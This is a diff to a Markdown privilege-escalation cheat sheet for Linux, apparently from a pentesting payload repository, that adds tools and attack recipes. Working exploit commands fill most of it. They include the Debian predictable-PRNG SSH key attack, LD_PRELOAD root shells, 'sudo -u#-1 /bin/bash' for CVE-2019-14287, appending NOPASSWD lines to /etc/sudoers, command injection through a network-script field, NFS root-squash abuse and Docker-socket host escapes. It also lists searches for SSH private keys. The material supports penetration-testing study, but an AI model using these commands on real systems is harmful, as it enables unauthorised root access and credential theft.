@@ -1,24 +1,18 @@
 # Linux - Privilege Escalation
 
-## Tools
-
-- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
-    ```powershell
-    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
-    ```
-- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
-- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
-- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
-
 ## Summary
 
-* [Checklist](#checklist)
+* [Tools](#tools)
+* [Checklist](#checklists)
 * [Looting for passwords](#looting-for-passwords)
     * [Files containing passwords](#files-containing-passwords)
     * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
     * [Last edited files](#last-edited-files)
     * [In memory passwords](#in-memory-passwords)
     * [Find sensitive files](#find-sensitive-files)
+* [SSH Key](#ssh-key)
+    * [Sensitive files](#sensitive-files)
+    * [SSH Key Predictable PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)
 * [Scheduled tasks](#scheduled-tasks)
     * [Cron jobs](#cron-jobs)
     * [Systemd timers](#systemd-timers)
@@ -31,9 +25,10 @@
     * [Interesting capabilities](#interesting-capabilities)
 * [SUDO](#sudo)
     * [NOPASSWD](#nopasswd)
-    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
+    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
     * [Doas](#doas)
     * [sudo_inject](#sudo-inject)
+    * [CVE-2019-14287](#cve-2019-14287)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
 * [Writable files](#writable-files)
@@ -51,6 +46,30 @@
     * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
     * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
     * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
+
+
+## Tools
+
+- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
+
+    ```powershell
+    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+    ./lse.sh -l1 # shows interesting information that should help you to privesc
+    ./lse.sh -l2 # dump all the information it gathers about the system
+    ```
+
+- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
+    
+    ```powershell
+    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+    ```
+
+- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
+- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
+- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
+- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
+
 
 ## Checklists
 
@@ -72,7 +91,7 @@
   * Checks if password hashes are stored in /etc/passwd
   * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
   * Attempt to read restricted files i.e. /etc/shadow
-  * List current users history files (i.e .bash_history, .nano_history etc.)
+  * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
   * Basic SSH checks
 * Privileged access:
   * Which users have recently used sudo
@@ -167,6 +186,61 @@ $ locate password | more
 ...
 ```
 
+## SSH Key
+
+### Sensitive files
+
+```
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+...
+```
+
+### SSH Key Predictable PRNG (Authorized_Keys) Process
+
+This module describes how to attempt to use an obtained authorized_keys file on a host system.
+
+Needed : SSH-DSS String from authorized_keys file
+
+**Steps**
+
+1. Get the authorized_keys file. An example of this file would look like so:
+
+```
+ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
+```
+
+2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
+
+```
+echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
+echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config
+/etc/init.d/ssh restart
+```
+
+3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
+
+```
+git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh
+tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+```
+
+4. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
+
+```
+grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
+dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
+```
+
+5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:
+
+```
+ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
+```
+
+And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
+
 ## Scheduled tasks
 
 ### Cron jobs
@@ -201,6 +275,14 @@ cat /etc/at.deny
 cat /etc/cron.allow
 cat /etc/cron.deny*
 ```
+
+You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
+
+```powershell
+# print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000 
+```
+
 
 ## Systemd timers
 
@@ -289,7 +371,27 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
+| Capabilities name  | Description |
+|---|---|
+| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
+| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
+| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
+| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
+| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
+| CAP_DAC_READ_SEARCH  | This only bypass file and directory read/execute permission checks  |
+| CAP_FOWNER  | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
+| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
+| CAP_SETGID  | Allow changing of the GID  |
+| CAP_SETUID  | Allow changing of the UID  |
+| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
+| CAP_IPC_LOCK  | This helps to lock memory  |
+| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
+| CAP_NET_RAW  | Use RAW and PACKET sockets |
+| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |
+
 ## SUDO
+
+Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
 ### NOPASSWD
 
@@ -317,7 +419,7 @@ If `LD_PRELOAD` is explicitly defined in the sudoers file
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Compile the following C code with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 ```powershell
 #include <stdio.h>
@@ -331,7 +433,7 @@ void _init() {
 }
 ```
 
-Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=/tmp/shell.so find`
+Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
 ### Doas
 
@@ -358,6 +460,18 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
+
+
+### CVE-2019-14287
+
+```powershell
+# Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
+```
 
 ## GTFOBins
 
@@ -392,10 +506,25 @@ Tool: [wildpwn](https://github.com/localh0t/wildpwn)
 List world writable files on the system.
 
 ```powershell
-find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
 find / -perm -2 -type f 2>/dev/null
 find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 ```
+
+### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+
+/etc/sysconfig/network-scripts/ifcfg-1337 for example
+
+```powershell
+NAME=Network /bin/id  &lt;= Note the blank space
+ONBOOT=yes
+DEVICE=eth0
+
+EXEC :
+./etc/sysconfig/network-scripts/ifcfg-1337
+```
+src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f]
+(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 ### Writable /etc/passwd
 
@@ -434,19 +563,22 @@ echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 
 # use SUDO without password
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-
 
 ## NFS Root Squashing
 
-When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it
+When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.
 
 ```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
 # create dir
 mkdir /tmp/nfsdir  
 
 # mount directory 
-mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
 cd /tmp/nfsdir
 
 # copy wanted shell 
@@ -553,6 +685,13 @@ sh-5.0# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+More docker privilege escalation using the Docker Socket.
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
 ### LXC/LXD
 
 The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
@@ -592,7 +731,7 @@ Precompiled exploits can be found inside these repositories, run them at your ow
 * [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
 * [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)
 
-The following exploits are known to work well.
+The following exploits are known to work well, search for another exploits using `searchsploit -w linux kernel centos`.
 
 ### CVE-2016-5195 (DirtyCow)
 
@@ -644,3 +783,5 @@ https://www.exploit-db.com/exploits/18411
 - [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
 - [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
 * [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
+* [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
